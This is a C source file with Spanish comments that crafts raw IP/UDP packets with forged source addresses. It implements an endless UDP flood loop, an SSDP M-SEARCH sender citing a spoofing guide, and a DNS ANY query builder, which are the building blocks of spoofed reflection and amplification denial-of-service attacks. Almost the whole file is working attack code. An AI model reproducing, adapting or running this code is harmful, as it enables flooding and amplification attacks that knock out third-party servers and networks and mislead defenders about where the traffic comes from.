#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>	//tcp header
#include <netinet/udp.h>	// udp header
#include <netinet/ip.h>	// ip_header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "./includes/checksum.h"
#include "./includes/udp.h"
#include "./includes/tcp.h"

#define DATAGRAM_LEN 4096

// Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len, char* mensaje){

    char *data , *pseudogram;

    char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

    //IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct iphdr));
	struct pseudo_header psh;

	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

	// Payload del paquete
	if(mensaje != NULL){
		data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
		strcpy(data , mensaje);
	}
	
	// IP header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data); //Tamaño de todo el paquete
	iph->id = htonl(rand() % 78123);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
    // header udp
	udph->source = src->sin_port;
	udph->dest = dst->sin_port;
	udph->len = htons(sizeof(struct udphdr) + strlen(data));
	udph->check = 0;
	
	//UDP checksum
	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.prt_length = htons(sizeof(struct udphdr) + strlen(data));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
	
	udph->check = csum( (unsigned short*) pseudogram , psize);

    *datagram_ret = datagram;
	*datagram_len = iph->tot_len;
	free(pseudogram);
}

void udp_flood(int sock, char* src, char* dst, int puerto, char* mensaje){
	while(1){
		// direccion IP de destino
		struct sockaddr_in daddr;
		if(host_addr(&daddr, dst, puerto) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		// direccion IP de origen
		struct sockaddr_in saddr;
		if(host_addr(&saddr, src, (rand() % 6000)) == 1){
			perror("Error al crear la configuracion IP");
			exit(1);
		}

		char* datagram;
		int datagram_len;

		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, mensaje);
		if (sendto(sock, datagram, datagram_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) == -1) {
            perror("Error al enviar el paquete SSDP");
            exit(1);
        } else {
			printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
		}
	}
}


// https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md
void ssdp(int sock, struct sockaddr_in* dst, struct sockaddr_in* src) {

	char* m_search = "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:5\r\n\r\n";

	char* datagram;
	int datagram_len;
	udp_datagram(src, dst, &datagram, &datagram_len, m_search);
    
    // Enviar los paquetes SSDP
    //while(1) {
        if (sendto(sock, datagram, datagram_len, 0, (struct sockaddr*)dst, sizeof(struct sockaddr)) == -1) {
            perror("Error al enviar el paquete SSDP");
            exit(1);
        } else {
			printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
		}
    //}
}

// Funcion que crea un datagrama UDP con un query DNS con el flag ANY de www.google.com
void udp_dns(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len){

	char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

	char* paquete_DNS = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

	// Set up the DNS header
	dns_header* dns = (dns_header*)paquete_DNS;
	dns->id = htons(0x1234);        // Identificador
	dns->rd = 1;                    // Recursion
	dns->qdcount = htons(1);        // 1 consulta

	// Preparar la pregunta dns
	char* qname = paquete_DNS + sizeof(dns_header);
	strcpy(qname, "\x03""www\x06""google\x03""com");   // Nombre del dominio a consultar

	dns_question* question = (dns_question*)(qname + strlen(qname) + 1);
	question->qtype = htons(255);    // Consulta ANY
	question->qclass = htons(1);     // Clase de la consulta IN

	// header UDP
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct iphdr));
	udph->source = src->sin_port;
	udph->dest = dst->sin_port;
	udph->len = htons(sizeof(struct udphdr) + sizeof(dns_header) + strlen(qname) + 1 + sizeof(dns_question));
	udph->check = 0;

    // header IP
	struct iphdr *iph = (struct iphdr *) datagram;
	
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_header) + strlen(qname) + 1 + sizeof(dns_question));
	iph->id = htonl(rand() % 78123);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, ntohs(iph->tot_len));

    *datagram_ret = datagram;
	*datagram_len = iph->tot_len;
}